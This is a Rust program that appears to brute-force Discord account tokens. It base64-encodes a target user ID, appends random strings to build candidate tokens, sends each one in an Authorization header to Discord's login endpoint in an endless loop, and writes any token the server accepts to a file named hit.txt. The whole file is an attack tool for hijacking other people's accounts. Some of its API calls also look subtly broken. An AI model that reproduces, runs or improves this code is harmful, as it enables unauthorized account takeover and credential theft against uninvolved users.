use base64;
use rand::Rng;
use reqwest::header::AUTHORIZATION;
use reqwest::Client;
use std::fs::OpenOptions;
use std::io::Write;
use std::io::{self, BufRead};

fn main() {
    let mut id_to_token = String::new();
    println!("ID TO TOKEN --> ");
    io::stdin()
        .lock()
        .read_line(&mut id_to_token)
        .expect("Failed to read input");
    let id_to_token = base64::encode(id_to_token.trim().as_bytes());

    loop {
        let token = format!(
            "{}.{}",
            id_to_token,
            generate_random_string(4) + "." + &generate_random_string(25)
        );
        let client = Client::new();
        let login_url = "https://discordapp.com/api/v9/auth/login";
        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert(AUTHORIZATION, token.parse().unwrap());

        let login = client.get(login_url).headers(headers).send();

        match login {
            Ok(response) => {
                if response.status() == reqwest::StatusCode::OK {
                    println!("\x1b[32m[+] VALID {}\x1b[0m", token);
                    let mut f = OpenOptions::new()
                        .create(true)
                        .append(true)
                        .open("hit.txt")
                        .expect("Failed to open file");
                    writeln!(f, "{}", token).expect("Failed to write to file");
                } else {
                    println!("\x1b[31m[-] INVALID {}\x1b[0m", token);
                }
            }
            Err(_) => {
                println!("\x1b[31m[-] INVALID {}\x1b[0m", token);
            }
        }
        println!("");
    }
}

fn generate_random_string(length: usize) -> String {
    let mut rng = rand::thread_rng();
    let characters: Vec<char> = (0..26)
        .map(|i| (i + b'a') as char)
        .chain((0..26).map(|i| (i + b'A') as char))
        .chain((0..10).map(|i| (i + b'0') as char))
        .collect();
    (0..length).map(|_| *rng.choose(&characters).unwrap()).collect()
}
